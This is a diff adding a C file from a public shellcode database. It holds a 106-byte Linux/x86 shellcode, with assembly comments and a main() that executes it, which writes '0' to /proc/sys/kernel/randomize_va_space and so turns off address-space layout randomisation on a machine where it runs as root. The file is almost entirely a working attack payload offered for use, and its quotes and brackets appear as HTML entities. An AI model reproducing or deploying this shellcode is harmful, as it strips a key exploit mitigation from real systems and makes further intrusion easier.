@@ -1,0 +1,64 @@
+/*
+Title:	 Linux/x86 - Disable randomize stack addresse - 106 bytes
+         (Set randomize_va_space to zero) 
+Author:  Jonathan Salwan &lt;submit (!) shell-storm.org>
+Web:     http://www.shell-storm.org
+Twitter: http://twitter.com/jonathansalwan
+
+!Database of Shellcodes http://www.shell-storm.org/shellcode/
+
+Date:	 2010-05-25
+Tested:  Linux 2.6.33 - i686
+
+! You need root euid
+*/
+
+
+
+#include &lt;stdio.h&gt;
+
+char sc[] = &quot;\x31\xdb&quot;                // xor    %ebx,%ebx
+            &quot;\x6a\x61&quot;                // push   $0x61
+            &quot;\x89\xe3&quot;                // mov    %esp,%ebx
+            &quot;\xb0\x0a&quot;                // mov    $0xa,%al
+            &quot;\xcd\x80&quot;                // int    $0x80
+            &quot;\x31\xdb&quot;                // xor    %ebx,%ebx
+            &quot;\x6a\x65&quot;                // push   $0x65
+            &quot;\x66\x68\x61\x63&quot;        // pushw  $0x6361
+            &quot;\x68\x61\x5f\x73\x70&quot;    // push   $0x70735f61
+            &quot;\x68\x7a\x65\x5f\x76&quot;    // push   $0x765f657a
+            &quot;\x68\x64\x6f\x6d\x69&quot;    // push   $0x696d6f64
+            &quot;\x68\x2f\x72\x61\x6e&quot;    // push   $0x6e61722f
+            &quot;\x68\x72\x6e\x65\x6c&quot;    // push   $0x6c656e72
+            &quot;\x68\x73\x2f\x6b\x65&quot;    // push   $0x656b2f73
+            &quot;\x68\x63\x2f\x73\x79&quot;    // push   $0x79732f63
+            &quot;\x68\x2f\x70\x72\x6f&quot;    // push   $0x6f72702f
+            &quot;\x89\xe3&quot;                // mov    %esp,%ebx
+            &quot;\x30\xc0&quot;                // xor    %al,%al
+            &quot;\xb0\x11&quot;                // mov    $0x11,%al
+            &quot;\x31\xc9&quot;                // xor    %ecx,%ecx
+            &quot;\x66\xb9\x41\x04&quot;        // mov    $0x441,%cx
+            &quot;\x31\xd2&quot;                // xor    %edx,%edx
+            &quot;\x66\xba\xa4\x01&quot;        // mov    $0x1a4,%dx
+            &quot;\x31\xc0&quot;                // xor    %eax,%eax
+            &quot;\xb0\x05&quot;                // mov    $0x5,%al
+            &quot;\xcd\x80&quot;                // int    $0x80
+            &quot;\x89\xc3&quot;                // mov    %eax,%ebx
+            &quot;\x31\xc9&quot;                // xor    %ecx,%ecx
+            &quot;\x66\x68\x30\x0a&quot;        // pushw  $0xa30
+            &quot;\x89\xe1&quot;                // mov    %esp,%ecx
+            &quot;\x31\xd2&quot;                // xor    %edx,%edx
+            &quot;\xb2\x02&quot;                // mov    $0x2,%dl
+            &quot;\x31\xc0&quot;                // xor    %eax,%eax
+            &quot;\xb0\x04&quot;                // mov    $0x4,%al
+            &quot;\xcd\x80&quot;                // int    $0x80
+            &quot;\xb0\x01&quot;                // mov    $0x1,%al
+            &quot;\xcd\x80&quot;;               // int    $0x80
+
+int main(void)
+{
+        fprintf(stdout,&quot;Length: %d\n&quot;,strlen(sc));
+        (*(void(*)()) sc)();
+
+return 0;
+}
